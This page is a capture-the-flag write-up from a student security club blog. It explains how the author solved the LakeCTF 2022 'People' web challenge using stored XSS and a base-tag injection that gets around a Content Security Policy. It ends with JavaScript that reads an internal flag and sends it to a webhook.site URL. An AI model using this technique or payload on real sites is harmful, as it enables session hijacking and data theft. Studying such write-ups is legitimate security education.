<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[LAKECTF 2022] People | NUS Greyhats</title><meta name=keywords content="writeups,ctf,web,base injection"><meta name=description content="A Walkthrough of the LakeCTF 2022 on Web: People"><meta name=author content="Wen Junhua"><link rel=canonical href=https://nusgreyhats.org/posts/writeups/lakectf-2022-people/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel=stylesheet><link crossorigin=anonymous href=/assets/css/stylesheet.min.b268fb3bd1950526ba32df2898e8dfc3171f0fecdf09cd6945557b277f0eecf8.css integrity="sha256-smj7O9GVBSa6Mt8omOjfwxcfD+zfCc1pRVV7J38O7Pg=" rel="preload stylesheet" as=style><link rel=preload href=/greyhats-dark.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://nusgreyhats.org/greyhats.png><link rel=icon type=image/png sizes=16x16 href=https://nusgreyhats.org/greyhats.png><link rel=icon type=image/png sizes=32x32 href=https://nusgreyhats.org/greyhats.png><link rel=apple-touch-icon href=https://nusgreyhats.org/greyhats.png><link rel=mask-icon href=https://nusgreyhats.org/greyhats.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.105.0"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[LAKECTF 2022] People"><meta property="og:description" content="A Walkthrough of the LakeCTF 2022 on Web: People"><meta property="og:type" content="article"><meta property="og:url" content="https://nusgreyhats.org/posts/writeups/lakectf-2022-people/"><meta property="og:image" content="https://nusgreyhats.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-27T00:00:00+08:00"><meta property="article:modified_time" content="2022-09-27T00:00:00+08:00"><meta property="og:site_name" content="NUS Greyhats"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nusgreyhats.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[LAKECTF 2022] People"><meta name=twitter:description content="A Walkthrough of the LakeCTF 2022 on Web: People"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://nusgreyhats.org/posts/"},{"@type":"ListItem","position":2,"name":"[LAKECTF 2022] People","item":"https://nusgreyhats.org/posts/writeups/lakectf-2022-people/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[LAKECTF 2022] People","name":"[LAKECTF 2022] People","description":"A Walkthrough of the LakeCTF 2022 on Web: People","keywords":["writeups","ctf","web","base injection"],"articleBody":"This is ported over from my blog. View the original post here\nWeb: People With the new People personal pages, all the members of the EPFL community can have their own page personalize it with Markdown and much more... http://chall.polygl0ts.ch:4000 This challenge involves a profile page that we can edit. There is also an admin who will visit our page when there is a profile that is reported.\nThe first thing that I though of was Cross Site Scripting. Usually, when there is an admin bot involve, chances are the website was vulnerable to cross site scripting.\nHere is the website\nScanning through the main file, I was looking for things that are user controlled inputs. If we take note of how the user inputs are treated. In this case these were the main code that we were looking at.\n... @main.route('/signup', methods=['POST']) @limiter.limit(\"4/minute\") def signup_post(): email = request.form.get('email') password = request.form.get('password') fullname = request.form.get('fullname') title = request.form.get('title') lab = request.form.get('lab') bio = request.form.get('bio') user = User.query.filter_by(email=email).first() if user: flash('Email address already exists', 'danger') return redirect(url_for('main.signup')) new_user = User(id=secrets.token_hex(16), email=email, password=generate_password_hash(password), fullname=fullname, title=title, lab=lab, bio=bio) db.session.add(new_user) db.session.commit() login_user(new_user) return redirect(url_for('main.profile')) ... @main.route('/edit', methods=['POST']) @login_required def edit_post(): User.query.filter_by(id=current_user.id).update({ 'fullname': request.form.get('fullname'), 'title': request.form.get('title'), 'lab': request.form.get('lab'), 'bio': request.form.get('bio') }) db.session.commit() return redirect(url_for('main.profile')) ... Looking at the functions above, we can see that they inputs from the users were not sanitized. This means that whatever we sent to might be loaded at some time later on. This seems like a good sign for Reflected XSS.\nAfter inspecting the webpage, we can see that some of our variables are on the page.\nNow that we know that our inputs can be tainted, we need to take a look at where the results of our inputs are loaded. The function mainly consists of the following code.\n... @main.route('/profile', defaults={'user_id': None}) @main.route('/profile/') def profile(user_id): if user_id: user = User.query.filter_by(id=user_id).first() if not user: abort(404) elif current_user.is_authenticated: user = current_user else: return redirect(url_for('main.login')) return render_template('profile.html', user=user, own_profile=user == current_user) ... This means that the variables were passed to the profile.html template which is rendered by jinja2.\nIn flask, the variables passed into it are autoescaped unless some instructions were used to unescape it, such as |safe or {% autoescape false %}. For more information you can refer to jinjaâ€™s documentation.\n\u003cdl class=\"definition-list definition-list-grid\"\u003e \u003cdt\u003eContact\u003c/dt\u003e \u003cdd class=\"flex\"\u003e \u003ca href=\"mailto:{{ user['email'] }}\" class=\"btn btn-sm btn-primary\" \u003e {{ user['email'] }} \u003c/a\u003e \u003c/dd\u003e \u003c/dl\u003e ... \u003cdd class=\"flex\"\u003e {% if own_profile %} \u003ca href=\"{{ url_for('main.edit') }}\" class=\"btn btn-sm btn-secondary\"\u003eEdit profile\u003c/a\u003e {% endif %} \u003cform action=\"{{ url_for('main.report', _external=True, user_id=user['id']) }}\" method=\"post\"\u003e \u003cbutton type=\"submit\" class=\"btn btn-sm btn-secondary\"\u003eReport profile\u003c/a\u003e \u003c/form\u003e \u003c/dd\u003e ... \u003cdiv class=\"markdown\"\u003e{{ user['bio'] }}\u003c/div\u003e ... {% set description = '%s at %s' % (user['title'], user['lab']) %} {% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %} As we can see from the template, most of the variables are loaded into the template with sanitization except for user['title'] and user['lab']. This means that it was the only place for us to put our XSS payload.\nUsing Burp Suite, I manage to trace down the request to edit the page. By sending it to the repeater, we can edit the request later to edit our profile at will.\nFrom the repeater page, we can see that all of the fields are sent over in plain text. Although title and lab are implemented as dropdowns within the website, we are still able to send other different values through burp.\nTime to send a script tag right?\nI was expecting to place a script there and call it a day, however, the flask file was protected by a Content Security Policy\ncsp = { 'script-src': '', 'object-src': \"'none'\", 'style-src': \"'self'\", 'default-src': ['*', 'data:'] } Talisman(app, force_https=False, strict_transport_security=False, session_cookie_secure=False, content_security_policy=csp, content_security_policy_nonce_in=['script-src']) This means that any of the scripts that I include must contain a nonce and any other objects I used cannot have an external source.\nHmm, I was stuck. I cannot use ","wordCount":"1194","inLanguage":"en","datePublished":"2022-09-27T00:00:00+08:00","dateModified":"2022-09-27T00:00:00+08:00","author":{"@type":"Person","name":"Wen Junhua"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://nusgreyhats.org/posts/writeups/lakectf-2022-people/"},"publisher":{"@type":"Organization","name":"NUS Greyhats","logo":{"@type":"ImageObject","url":"https://nusgreyhats.org/greyhats.png"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://nusgreyhats.org/ accesskey=h title="NUS Greyhats (Alt + H)"><img src=/greyhats-dark.png alt=logo aria-label=logo id=logo height=35>
<script>localStorage.getItem("pref-theme")==="light"?document.getElementById("logo").src="/greyhats.png":document.getElementById("logo").src="/greyhats-dark.png"</script>NUS Greyhats</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://nusgreyhats.org/team title="the team"><span>the team</span></a></li><li><a href=https://nusgreyhats.org/secweds title=secweds><span>secweds</span></a></li><li><a href=https://nusgreyhats.org/resources/ title=resources><span>resources</span></a></li><li><a href=https://nusgreyhats.org/tags/ title=tags><span>tags</span></a></li><li><a href=https://nusgreyhats.org/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>[LAKECTF 2022] People</h1><div class=post-description>A Walkthrough of the LakeCTF 2022 on Web: People</div><div class=post-meta>September 27, 2022&nbsp;Â·&nbsp;6 min&nbsp;Â·&nbsp;Wen Junhua&nbsp;|&nbsp;<a href=https://github.com/NUSGreyhats/NUSGreyhats.github.io/tree/master/content/posts/writeups/[LAKECTF%202022]%20People.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p>This is ported over from <a href=https://jh123x.com>my blog</a>. View the original post <a href=https://jh123x.com/blog/2022-09-26/>here</a></p><h2 id=web-people>Web: People<a hidden class=anchor aria-hidden=true href=#web-people>#</a></h2><pre tabindex=0><code>With the new People personal pages,
all the members of the EPFL community
can have their own page personalize it
with Markdown and much more...

http://chall.polygl0ts.ch:4000
</code></pre><p>This challenge involves a profile page that we can edit. There is also an admin who will visit our page when there is a profile that is reported.</p><p>The first thing that I though of was Cross Site Scripting. Usually, when there is an admin bot involve, chances are the website was vulnerable to cross site scripting.</p><p>Here is the website</p><p><img loading=lazy src=/images/lakectf-people/signup%20page.png alt="Website for CTF"></p><p>Scanning through the main file, I was looking for things that are user controlled inputs. If we take note of how the user inputs are treated. In this case these were the main code that we were looking at.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@main</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/signup&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#a6e22e>@limiter</span><span style=color:#f92672>.</span>limit(<span style=color:#e6db74>&#34;4/minute&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>signup_post</span>():
</span></span><span style=display:flex><span>    email <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;email&#39;</span>)
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>    fullname <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;fullname&#39;</span>)
</span></span><span style=display:flex><span>    title <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;title&#39;</span>)
</span></span><span style=display:flex><span>    lab <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;lab&#39;</span>)
</span></span><span style=display:flex><span>    bio <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;bio&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(email<span style=color:#f92672>=</span>email)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user:
</span></span><span style=display:flex><span>        flash(<span style=color:#e6db74>&#39;Email address already exists&#39;</span>, <span style=color:#e6db74>&#39;danger&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;main.signup&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    new_user <span style=color:#f92672>=</span> User(id<span style=color:#f92672>=</span>secrets<span style=color:#f92672>.</span>token_hex(<span style=color:#ae81ff>16</span>),
</span></span><span style=display:flex><span>                    email<span style=color:#f92672>=</span>email,
</span></span><span style=display:flex><span>                    password<span style=color:#f92672>=</span>generate_password_hash(password),
</span></span><span style=display:flex><span>                    fullname<span style=color:#f92672>=</span>fullname,
</span></span><span style=display:flex><span>                    title<span style=color:#f92672>=</span>title,
</span></span><span style=display:flex><span>                    lab<span style=color:#f92672>=</span>lab,
</span></span><span style=display:flex><span>                    bio<span style=color:#f92672>=</span>bio)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>add(new_user)
</span></span><span style=display:flex><span>    db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    login_user(new_user)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;main.profile&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@main</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/edit&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>edit_post</span>():
</span></span><span style=display:flex><span>    User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(id<span style=color:#f92672>=</span>current_user<span style=color:#f92672>.</span>id)<span style=color:#f92672>.</span>update({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;fullname&#39;</span>: request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;fullname&#39;</span>),
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;title&#39;</span>: request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;title&#39;</span>),
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;lab&#39;</span>: request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;lab&#39;</span>),
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;bio&#39;</span>: request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;bio&#39;</span>)
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    db<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>commit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;main.profile&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><p>Looking at the functions above, we can see that they inputs from the users were not sanitized. This means that whatever we sent to might be loaded at some time later on. This seems like a good sign for Reflected XSS.</p><p><img loading=lazy src=/images/lakectf-people/login%20page.png alt="Login page"></p><p>After inspecting the webpage, we can see that some of our variables are on the page.</p><p>Now that we know that our inputs can be tainted, we need to take a look at where the results of our inputs are loaded.
The function mainly consists of the following code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@main</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/profile&#39;</span>, defaults<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;user_id&#39;</span>: <span style=color:#66d9ef>None</span>})
</span></span><span style=display:flex><span><span style=color:#a6e22e>@main</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/profile/&lt;user_id&gt;&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>profile</span>(user_id):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user_id:
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(id<span style=color:#f92672>=</span>user_id)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user:
</span></span><span style=display:flex><span>            abort(<span style=color:#ae81ff>404</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> current_user<span style=color:#f92672>.</span>is_authenticated:
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> current_user
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(url_for(<span style=color:#e6db74>&#39;main.login&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;profile.html&#39;</span>, user<span style=color:#f92672>=</span>user, own_profile<span style=color:#f92672>=</span>user <span style=color:#f92672>==</span> current_user)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><p>This means that the variables were passed to the <code>profile.html</code> template which is rendered by <code>jinja2</code>.</p><p>In flask, the variables passed into it are autoescaped unless some instructions were used to unescape it, such as <code>|safe</code> or <code>{% autoescape false %}</code>. For more information you can refer to <a href=https://jinja.palletsprojects.com/en/3.1.x/templates/#autoescape-extension>jinja&rsquo;s documentation</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>dl</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;definition-list definition-list-grid&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>dt</span>&gt;Contact&lt;/<span style=color:#f92672>dt</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>dd</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flex&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>a</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mailto:{{ user[&#39;email&#39;] }}&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-sm btn-primary&#34;</span>
</span></span><span style=display:flex><span>        &gt;
</span></span><span style=display:flex><span>            {{ user[&#39;email&#39;] }}
</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>dd</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>dl</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>dd</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flex&#34;</span>&gt;
</span></span><span style=display:flex><span>    {% if own_profile %}
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;{{ url_for(&#39;main.edit&#39;) }}&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-sm btn-secondary&#34;</span>&gt;Edit profile&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>    {% endif %}
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;{{ url_for(&#39;main.report&#39;, _external=True, user_id=user[&#39;id&#39;]) }}&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-sm btn-secondary&#34;</span>&gt;Report profile&lt;/<span style=color:#f92672>a</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>dd</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;markdown&#34;</span>&gt;{{ user[&#39;bio&#39;] }}&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{% set description = &#39;%s at %s&#39; % (user[&#39;title&#39;], user[&#39;lab&#39;]) %}
</span></span><span style=display:flex><span>{% block title %}{{user[&#39;fullname&#39;]}} | {{description|safe}}{% endblock %}
</span></span></code></pre></div><p>As we can see from the template, most of the variables are loaded into the template with sanitization except for <code>user['title'] and user['lab']</code>. This means that it was the only place for us to put our XSS payload.</p><p><img loading=lazy src=/images/lakectf-people/burp%20edit%20page.png alt="Burp Suit Track Request"></p><p>Using <a href=https://portswigger.net/burp>Burp Suite</a>, I manage to trace down the request to edit the page. By sending it to the repeater, we can edit the request later to edit our profile at will.</p><p><img loading=lazy src=/images/lakectf-people/burp%20repeater%20page.png alt="Burp Suit Repeater page"></p><p>From the repeater page, we can see that all of the fields are sent over in plain text. Although <code>title</code> and <code>lab</code> are implemented as dropdowns within the website, we are still able to send other different values through <code>burp</code>.</p><p>Time to send a script tag right?</p><p><img loading=lazy src=/images/lakectf-people/script%20edit.png alt="After sending script tag"></p><p>I was expecting to place a script there and call it a day, however, the flask file was protected by a <a href=https://jh123x.com/blog/2021-12-02/>Content Security Policy</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>csp <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;script-src&#39;</span>: <span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;object-src&#39;</span>: <span style=color:#e6db74>&#34;&#39;none&#39;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;style-src&#39;</span>: <span style=color:#e6db74>&#34;&#39;self&#39;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;default-src&#39;</span>: [<span style=color:#e6db74>&#39;*&#39;</span>, <span style=color:#e6db74>&#39;data:&#39;</span>]
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>Talisman(app,
</span></span><span style=display:flex><span>    force_https<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>,
</span></span><span style=display:flex><span>    strict_transport_security<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>,
</span></span><span style=display:flex><span>    session_cookie_secure<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>,
</span></span><span style=display:flex><span>    content_security_policy<span style=color:#f92672>=</span>csp,
</span></span><span style=display:flex><span>    content_security_policy_nonce_in<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;script-src&#39;</span>])
</span></span></code></pre></div><p>This means that any of the scripts that I include must contain a <code>nonce</code> and any other objects I used cannot have an external source.</p><p>Hmm, I was stuck. I cannot use <code>&lt;script></code> or <code>&lt;img onerror='...'></code> directly anymore. I needed another way to bypass this.</p><p>From the help of another CTF fellow player, I learnt that there was something called a <code>base</code> injection. A <a href=https://www.w3schools.com/tags/tag_base.asp><code>&lt;base></code> tag</a> can be injected into the website which makes it default all its import links to use that url as a base.</p><p>If I inject that into the title field, any subsequent script tags will import from that base instead.</p><p>Time to put that into action.</p><p>I uploaded by script to <a href=https://github.com/Jh123x/payload>github here</a> and setup github pages to give me an ip address to use as a base. I also created a folder structure that corresponds to the path that the website is importing from.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>httpGet</span>(<span style=color:#a6e22e>theUrl</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>xmlHttp</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>XMLHttpRequest</span>();
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>xmlHttp</span>.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#a6e22e>theUrl</span>, <span style=color:#66d9ef>false</span>); <span style=color:#75715e>// false for synchronous request
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>xmlHttp</span>.<span style=color:#a6e22e>send</span>(<span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>xmlHttp</span>.<span style=color:#a6e22e>responseText</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>payload1</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>resp456416512364p</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>httpGet</span>(<span style=color:#e6db74>&#34;http://web:8080/flag&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>payload1</span> <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;https://webhook.site/5e88af09-1ab7-408f-bf46-65e63746ee3e/?c=&#34;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>resp456416512364p</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Error&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>DOMPurify</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>sanitize</span><span style=color:#f92672>:</span> () =&gt; {
</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>payload1</span>;
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>document.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>payload1</span>;
